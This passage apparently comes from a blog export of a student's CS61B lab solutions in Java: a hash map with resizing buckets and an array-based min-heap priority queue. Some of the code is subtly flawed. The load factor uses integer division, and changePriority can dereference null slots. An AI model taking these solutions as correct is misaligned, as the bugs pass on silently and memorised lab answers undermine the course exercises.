&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Returns the number of key-value mappings in this map. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//////////////// EVERYTHING BELOW THIS LINE IS OPTIONAL ////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Returns a Set view of the keys contained in this map. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;K&gt; <span class="title">keySet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Removes KEY from the tree if present</span></span><br><span class="line"><span class="comment">     *  returns VALUE removed,</span></span><br><span class="line"><span class="comment">     *  null on failed removal.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(K key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Removes the key-value entry for the specified key only if it is</span></span><br><span class="line"><span class="comment">     *  currently mapped to the specified value.  Returns the VALUE removed,</span></span><br><span class="line"><span class="comment">     *  null on failed removal.</span></span><br><span class="line"><span class="comment">     **/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;K&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-MyHashMap"><a href="#2-MyHashMap" class="headerlink" title="2: MyHashMap"></a>2: MyHashMap</h2><p>The skeleton provides a MyHashMap that implements the Map61B interface in a file named MyHashMap.java. Your implementation is required to implement get, put, and size. Other methods such as remove, keySet, and iterator are optional for this lab, and by default should throw an UnsupportedOperationException unless you choose to implement them. We’ve provided instance variables for you.</p>
<p>We provide the following constructors:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyHashMap</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyHashMap</span><span class="params">(<span class="keyword">int</span> initialSize)</span></span>;</span><br></pre></td></tr></table></figure>
<p>We also provide the clear method and a private hash method that computes the hash function of a key.</p>
<p>Unlike lecture (where each bucket was represented as a naked recursive linked list), each bucket in this lab is implemented as an ArrayMap, similar to what we developed in lecture 13. Because our bucket class is so powerful, your get and put methods will be very short (our get method is only 2 lines, and our put method isn’t many more).</p>
<p>While using such a sophisticated bucket class seems like cheating, it’s not. Delegating work to a helper class is a very important way to manage complexity, and there’s really no reason that the MyHashMap class should be doing things like manually scanning through buckets – that’s the bucket’s job!</p>
<p>Start by implementing get, put, and size with no resizing. After you’ve made figured these out, modify put so that it resizes. You should resize the array of buckets anytime the load factor exceeds MAX_LF, and you should resize multiplicatively (e.g. doubling the number of buckets) rather than arithmetically (e.g. adding 100 new buckets).</p>
<p>You can test your implementation using the TestMyHashMap class in the lab9tester package.</p>
<p>Solution:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab9;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  A hash table-backed Map implementation. Provides amortized constant time</span></span><br><span class="line"><span class="comment"> *  access to elements via get(), remove(), and put() in the best case.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@author</span> Macon</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHashMap</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map61B</span>&lt;<span class="title">K</span>, <span class="title">V</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_SIZE = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">double</span> MAX_LF = <span class="number">0.75</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ArrayMap&lt;K, V&gt;[] buckets;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">loadFactor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size / buckets.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        buckets = <span class="keyword">new</span> ArrayMap[DEFAULT_SIZE];</span><br><span class="line">        <span class="keyword">this</span>.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyHashMap</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        buckets = <span class="keyword">new</span> ArrayMap[capacity];</span><br><span class="line">        <span class="keyword">this</span>.clear();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Removes all of the mappings from this map. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.buckets.length; i += <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.buckets[i] = <span class="keyword">new</span> ArrayMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Computes the hash function of the given key. Consists of</span></span><br><span class="line"><span class="comment">     *  computing the hashcode, followed by modding by the number of buckets.</span></span><br><span class="line"><span class="comment">     *  To handle negative numbers properly, uses floorMod instead of %.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(K key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> numBuckets = buckets.length;</span><br><span class="line">        <span class="keyword">return</span> Math.floorMod(key.hashCode(), numBuckets);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Returns the value to which the specified key is mapped, or null if this</span></span><br><span class="line"><span class="comment">     * map contains no mapping for the key.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(K key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"the key is null!"</span>);</span><br><span class="line">        <span class="keyword">int</span> i = hash(key);</span><br><span class="line">        <span class="keyword">return</span> buckets[i].get(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Associates the specified value with the specified key in this map. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"first argument to put is null"</span>);</span><br><span class="line">        <span class="keyword">if</span> (loadFactor() &gt; MAX_LF) &#123;</span><br><span class="line">            resize(<span class="number">2</span> * buckets.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i = hash(key);</span><br><span class="line">        <span class="keyword">if</span> (!buckets[i].containsKey(key)) size++;</span><br><span class="line">        buckets[i].put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">        MyHashMap&lt;K, V&gt; mhm = <span class="keyword">new</span> MyHashMap&lt;&gt;(capacity);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; buckets.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (K key : buckets[i].keySet()) &#123;</span><br><span class="line">                mhm.put(key, buckets[i].get(key));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.size = mhm.size;</span><br><span class="line">        <span class="keyword">this</span>.buckets = mhm.buckets;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Returns the number of key-value mappings in this map. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//////////////// EVERYTHING BELOW THIS LINE IS OPTIONAL ////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Returns a Set view of the keys contained in this map. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Set&lt;K&gt; <span class="title">keySet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Removes the mapping for the specified key from this map if exists.</span></span><br><span class="line"><span class="comment">     * Not required for this lab. If you don't implement this, throw an</span></span><br><span class="line"><span class="comment">     * UnsupportedOperationException. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(K key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Removes the entry for the specified key only if it is currently mapped to</span></span><br><span class="line"><span class="comment">     * the specified value. Not required for this lab. If you don't implement this,</span></span><br><span class="line"><span class="comment">     * throw an UnsupportedOperationException.*/</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;K&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-lab10</title>
    <url>/2018/11/05/cs61b-lab10/</url>
    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.Assert.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A Generic heap class. Unlike Java's priority queue, this heap doesn't just</span></span><br><span class="line"><span class="comment"> * store Comparable objects. Instead, it can store any type of object</span></span><br><span class="line"><span class="comment"> * (represented by type T), along with a priority value. Why do it this way? It</span></span><br><span class="line"><span class="comment"> * will be useful later on in the class...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayHeap</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">ExtrinsicPQ</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Node[] contents;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ArrayHeap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        contents = <span class="keyword">new</span> ArrayHeap.Node[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Add a dummy item at the front of the ArrayHeap so that the getLeft,</span></span><br><span class="line"><span class="comment">         * getRight, and parent methods are nicer. */</span></span><br><span class="line">        contents[<span class="number">0</span>] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Even though there is an empty spot at the front, we still consider</span></span><br><span class="line"><span class="comment">         * the size to be 0 since nothing has been inserted yet. */</span></span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the index of the node to the left of the node at i.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">leftIndex</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> Your code here! */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the index of the node to the right of the node at i.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rightIndex</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> Your code here! */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the index of the node that is the parent of the node at i.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">parentIndex</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> Your code here! */</span></span><br><span class="line">        <span class="keyword">return</span> i / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Gets the node at the ith index, or returns null if the index is out of</span></span><br><span class="line"><span class="comment">     * bounds.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">getNode</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!inBounds(index)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> contents[index];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns true if the index corresponds to a valid item. For example, if</span></span><br><span class="line"><span class="comment">     * we have 5 items, then the valid indices are 1, 2, 3, 4, 5. Index 0 is</span></span><br><span class="line"><span class="comment">     * invalid because we leave the 0th entry blank.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">inBounds</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((index &gt; size) || (index &lt; <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Swap the nodes at the two indices.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> index1, <span class="keyword">int</span> index2)</span> </span>&#123;</span><br><span class="line">        Node node1 = getNode(index1);</span><br><span class="line">        Node node2 = getNode(index2);</span><br><span class="line">        contents[index1] = node2;</span><br><span class="line">        contents[index2] = node1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the index of the node with smaller priority. Precondition: not</span></span><br><span class="line"><span class="comment">     * both nodes are null.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> index1, <span class="keyword">int</span> index2)</span> </span>&#123;</span><br><span class="line">        Node node1 = getNode(index1);</span><br><span class="line">        Node node2 = getNode(index2);</span><br><span class="line">        <span class="keyword">if</span> (node1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> index2;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> index1;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (node1.myPriority &lt; node2.myPriority) &#123;</span><br><span class="line">            <span class="keyword">return</span> index1;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> index2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bubbles up the node currently at the given index.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Throws an exception if index is invalid. DON'T CHANGE THIS LINE.</span></span><br><span class="line">        validateSinkSwimArg(index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">TODO:</span> Your code here. */</span></span><br><span class="line">        <span class="keyword">while</span> (index &gt; <span class="number">1</span> &amp;&amp; (getNode(index).myPriority) &lt; (getNode(parentIndex(index)).myPriority) ) &#123;</span><br><span class="line">            swap(index, parentIndex(index));</span><br><span class="line">            index /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bubbles down the node currently at the given index.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sink</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Throws an exception if index is invalid. DON'T CHANGE THIS LINE.</span></span><br><span class="line">        validateSinkSwimArg(index);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** <span class="doctag">TODO:</span> Your code here. */</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">2</span> * index &lt;= size) &#123;</span><br><span class="line">            <span class="keyword">int</span> j = <span class="number">2</span> * index;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; size &amp;&amp; (getNode(j).myPriority &gt; getNode(j+<span class="number">1</span>).myPriority)) j++;</span><br><span class="line">            <span class="keyword">if</span> (getNode(index).myPriority &lt; getNode(j).myPriority) <span class="keyword">break</span>;</span><br><span class="line">            swap(index, j);</span><br><span class="line">            index = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Inserts an item with the given priority value. This is enqueue, or offer.</span></span><br><span class="line"><span class="comment">     * To implement this method, add it to the end of the ArrayList, then swim it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(T item, <span class="keyword">double</span> priority)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* If the array is totally full, resize. */</span></span><br><span class="line">        <span class="keyword">if</span> (size + <span class="number">1</span> == contents.length) &#123;</span><br><span class="line">            resize(contents.length * <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> Your code here! */</span></span><br><span class="line">        contents[++size] = <span class="keyword">new</span> Node(item, priority);</span><br><span class="line">        swim(size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the Node with the smallest priority value, but does not remove it</span></span><br><span class="line"><span class="comment">     * from the heap. To implement this, return the item in the 1st position of the ArrayList.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> Your code here! */</span></span><br><span class="line">        <span class="keyword">return</span> contents[<span class="number">1</span>].myItem;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the Node with the smallest priority value, and removes it from</span></span><br><span class="line"><span class="comment">     * the heap. This is dequeue, or poll. To implement this, swap the last</span></span><br><span class="line"><span class="comment">     * item from the heap into the root position, then sink the root. This is</span></span><br><span class="line"><span class="comment">     * equivalent to firing the president of the company, taking the last</span></span><br><span class="line"><span class="comment">     * person on the list on payroll, making them president, and then demoting</span></span><br><span class="line"><span class="comment">     * them repeatedly. Make sure to avoid loitering by nulling out the dead</span></span><br><span class="line"><span class="comment">     * item.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">removeMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> Your code here! */</span></span><br><span class="line">        T min = peek();</span><br><span class="line">        swap(<span class="number">1</span>, size);</span><br><span class="line">        size--;</span><br><span class="line">        contents[size + <span class="number">1</span>] = <span class="keyword">null</span>;</span><br><span class="line">        sink(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the number of items in the PQ. This is one less than the size</span></span><br><span class="line"><span class="comment">     * of the backing ArrayList because we leave the 0th element empty. This</span></span><br><span class="line"><span class="comment">     * method has been implemented for you.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Change the node in this heap with the given item to have the given</span></span><br><span class="line"><span class="comment">     * priority. You can assume the heap will not have two nodes with the same</span></span><br><span class="line"><span class="comment">     * item. Check item equality with .equals(), not ==. This is a challenging</span></span><br><span class="line"><span class="comment">     * bonus problem, but shouldn't be too hard if you really understand heaps</span></span><br><span class="line"><span class="comment">     * and think about the algorithm before you start to code.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">changePriority</span><span class="params">(T item, <span class="keyword">double</span> priority)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> Your code here! */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= size; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (contents[i].item().equals(item)) &#123;</span><br><span class="line">                contents[i].myPriority = priority;</span><br><span class="line">                <span class="keyword">if</span> (priority &lt; contents[parentIndex(i)].myPriority) &#123;</span><br><span class="line">                    swim(i);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (priority &gt; contents[leftIndex(i)].myPriority || priority &gt; contents[rightIndex(i)].myPriority) &#123;</span><br><span class="line">                    sink(i);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Prints out the heap sideways. Provided for you.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> toStringHelper(<span class="number">1</span>, <span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Recursive helper method for toString. */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">toStringHelper</span><span class="params">(<span class="keyword">int</span> index, String soFar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (getNode(index) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String toReturn = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">int</span> rightChild = rightIndex(index);</span><br><span class="line">            toReturn += toStringHelper(rightChild, <span class="string">"        "</span> + soFar);</span><br><span class="line">            <span class="keyword">if</span> (getNode(rightChild) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                toReturn += soFar + <span class="string">"    /"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            toReturn += <span class="string">"\n"</span> + soFar + getNode(index) + <span class="string">"\n"</span>;</span><br><span class="line">            <span class="keyword">int</span> leftChild = leftIndex(index);</span><br><span class="line">            <span class="keyword">if</span> (getNode(leftChild) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                toReturn += soFar + <span class="string">"    \\"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            toReturn += toStringHelper(leftChild, <span class="string">"        "</span> + soFar);</span><br><span class="line">            <span class="keyword">return</span> toReturn;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Throws an exception if the index is invalid for sinking or swimming.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validateSinkSwimArg</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot sink or swim nodes with index 0 or less"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (index &gt; size) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot sink or swim nodes with index greater than current size."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (contents[index] == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Cannot sink or swim a null node."</span>);</span><br><span 